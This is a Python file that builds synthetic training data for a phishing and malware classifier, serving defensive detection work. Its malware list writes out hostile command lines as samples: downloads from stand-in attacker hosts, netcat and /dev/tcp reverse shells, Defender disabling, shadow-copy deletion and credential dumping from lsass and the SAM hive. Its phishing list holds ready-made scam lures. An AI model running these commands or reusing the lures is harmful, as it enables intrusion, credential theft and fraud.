"""
Synthetic Training Data Generator.
"""

from typing import List, Tuple
import random


class ThreatDataGenerator:
    """Generates synthetic training data for ML models."""

    @staticmethod
    def generate_training_data() -> Tuple[List[str], List[int]]:
        """Generate training dataset. Labels: 0=Phishing, 1=Malware, 2=Safe"""

        phishing_samples = [
            "Dear customer, your account has been suspended. Click here to verify your identity immediately.",
            "URGENT: Your password will expire in 24 hours. Update now to avoid losing access.",
            "Your PayPal account has unusual activity. Confirm your credentials now.",
            "Dear valued user, verify your account within 24 hours or it will be terminated.",
            "ALERT: Unauthorized login attempt detected. Reset your password immediately.",
            "Your Netflix subscription expired. Update payment method: bit.ly/netflix-update",
            "Your Apple ID was used to sign in. If this was not you, click here now.",
            "Bank of America Security Alert: Confirm your SSN to continue using your account.",
            "Dear user your account shows suspicious activity please verify immediately",
            "Amazon account locked due to suspicious activity verify your payment method now",
            "Urgent notice from Microsoft your windows license expired activate immediately",
            "Security alert unusual sign in activity confirm your account credentials",
            "Your credit card has been charged verify transaction by clicking link below",
            "Account verification required failure to comply will result in termination",
            "Dear customer confirm your identity by clicking the secure link below",
            "Your subscription payment failed update payment method to continue access",
            "We detected unusual activity on your Chase account please verify your identity",
            "Your Wells Fargo account requires immediate attention click to verify",
            "Citibank Security Notice your account has been temporarily limited verify now",
            "TD Bank Alert unusual transaction detected confirm or deny this activity",
            "Congratulations! You have won $1,000,000. Send your bank details to claim your prize.",
            "You have been selected for a cash prize click the link to claim your reward",
            "Your lottery ticket won click here within 24 hours to claim prize money",
            "Congratulations winner you have been randomly selected claim your reward now",
            "Prize notification you won a new iPhone claim by providing shipping details",
            "IRS Notice: You owe back taxes. Pay immediately via gift card to avoid arrest.",
            "Urgent tax refund available claim your money by submitting bank details",
            "Social Security Administration your benefits are suspended call immediately",
            "Your package could not be delivered click tracking link update address",
            "FedEx delivery failed reschedule delivery by updating shipping information",
            "USPS your package is waiting confirm delivery address to receive",
            "Bank security notice verify your account to prevent unauthorized access",
            "Your bank account will be closed verify your information now",
            "Unusual transaction detected on your account please confirm activity",
            "Microsoft Support Alert your computer has been compromised call now",
            "Apple Security your iCloud has been breached reset password immediately",
            "Google Account Warning suspicious activity detected verify now",
            "Inheritance notification you have been named beneficiary send personal details",
            "Job offer work from home earn $5000 weekly provide banking info for payment",
            "HR Notice update your direct deposit information for payroll processing",
        ]

        malware_samples = [
            "powershell -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOZXctT2JqZWN0",
            "powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\payload.ps1",
            "powershell -NoProfile -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString",
            "powershell bypass executionpolicy download file from remote server execute",
            "powershell Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile shell.ps1",
            "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
            "fileless malware memory resident attack powershell living off land",
            "cmd.exe /c wget http://malicious.com/payload.exe && chmod +x payload.exe",
            "cmd /c certutil -urlcache -split -f http://attacker.com/mal.exe mal.exe",
            "cmd.exe /c bitsadmin /transfer job http://evil.com/trojan.exe c:\\trojan.exe",
            "Download invoice.exe to view your bill. Enable macros for best experience.",
            "New-Object Net.WebClient DownloadFile http://evil.com/mal.exe mal.exe",
            "certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe",
            "curl -o payload.exe http://malicious-server.com/trojan.exe",
            "reg add HKLM SOFTWARE Microsoft Windows CurrentVersion Run /v malware",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d malware.exe",
            "registry modification persistence mechanism startup key added",
            "schtasks /create /sc minute /mo 5 /tn backdoor /tr nc.exe -e cmd.exe",
            "schtasks /create /tn SystemUpdate /tr powershell.exe -enc /sc onlogon",
            "create scheduled task persistence reboot survival mechanism installed",
            "wscript.exe //B //E:jscript C:/Users/Public/dropper.js",
            "mshta vbscript Execute CreateObject Wscript.Shell Run payload",
            "rundll32.exe javascript:..\\mshtml,RunHTMLApplication",
            "process injection shellcode buffer overflow exploit payload delivery",
            "mimikatz credential dumping lsass memory extraction password hashes",
            "privilege escalation exploit vulnerability gain administrator access",
            "netcat reverse shell connection attacker controlled server backdoor",
            "nc -e /bin/sh attacker.com 4444",
            "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
            "keylogger installation capture keystrokes exfiltrate sensitive data",
            "ransomware encryption file locker bitcoin payment decrypt files",
            "trojan dropper download additional malware components execute silently",
            "rootkit installation hide malicious processes kernel level access",
            "disable windows defender modify registry keys persistence mechanism",
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "vssadmin delete shadows /all /quiet",
            "sekurlsa::logonpasswords mimikatz",
            "procdump -ma lsass.exe lsass.dmp",
            "credential dumping ntds.dit active directory database",
            "reg save HKLM\\SAM sam.save",
        ]

        safe_samples = [
            "Hi team, please review the quarterly report and provide feedback by Friday.",
            "Meeting reminder: Project sync at 2 PM in Conference Room B tomorrow.",
            "The new software update has been deployed successfully to all systems.",
            "Please find attached the meeting minutes from yesterday's discussion.",
            "Reminder: Complete your timesheet by end of day today.",
            "Great job on the presentation! The client was very impressed.",
            "Hello everyone the project deadline has been extended by one week",
            "Please remember to submit your expense reports before month end",
            "Thank you for attending the training session feedback is appreciated",
            "The office will be closed next Monday for the holiday",
            "Please review the attached document and provide your comments",
            "The new employee orientation will be held next Tuesday morning",
            "Thank you for your patience while we resolved the technical issue",
            "Reminder to update your contact information in the HR system",
            "Please join us for the monthly town hall meeting this afternoon",
            "Thank you for your feedback it helps us improve our services",
            "The new policy document has been uploaded to the shared drive",
            "Please complete the annual compliance training by end of month",
            "The team lunch is scheduled for Friday at noon everyone welcome",
            "Thank you for your continued dedication to excellence",
            "The quarterly review meeting has been rescheduled to next week",
            "Please remember to backup your important files regularly",
            "Welcome aboard we are excited to have you join our team",
            "Thank you for your purchase. Your order #12345 has been shipped.",
            "Weekly newsletter: Check out our latest blog posts and company updates.",
            "Your order has been confirmed and will arrive in 3-5 business days.",
            "Happy birthday! The team wishes you a wonderful celebration.",
            "Congratulations on your promotion well deserved recognition",
            "The server maintenance is scheduled for this weekend. Plan accordingly.",
            "System update completed successfully all services are operational",
            "Please restart your computer to apply the latest security patches",
            "Open enrollment for health benefits begins next month",
            "Performance review meetings scheduled for next week check calendar",
            "Sprint planning meeting tomorrow at 10 AM please prepare updates",
            "Code review completed for the authentication module looks good",
            "Test results passed for the new feature ready for deployment",
            "Documentation updated for the API changes see wiki for details",
            "Bug fix deployed to production monitoring for any issues",
            "The network upgrade is complete connectivity should be improved",
            "VPN connection guide for remote workers attached to this email",
        ]

        texts = phishing_samples + malware_samples + safe_samples
        labels = ([0] * len(phishing_samples) +
                  [1] * len(malware_samples) +
                  [2] * len(safe_samples))

        return texts, labels

    @staticmethod
    def generate_augmented_data(texts: List[str], labels: List[int],
                                augment_factor: int = 2) -> Tuple[List[str], List[int]]:
        """Augment training data with variations."""
        augmented_texts = texts.copy()
        augmented_labels = labels.copy()

        for text, label in zip(texts, labels):
            for _ in range(augment_factor - 1):
                modified = text
                if random.random() > 0.5:
                    words = modified.split()
                    if words:
                        idx = random.randint(0, len(words) - 1)
                        words[idx] = words[idx].upper()
                        modified = ' '.join(words)
                augmented_texts.append(modified)
                augmented_labels.append(label)

        return augmented_texts, augmented_labels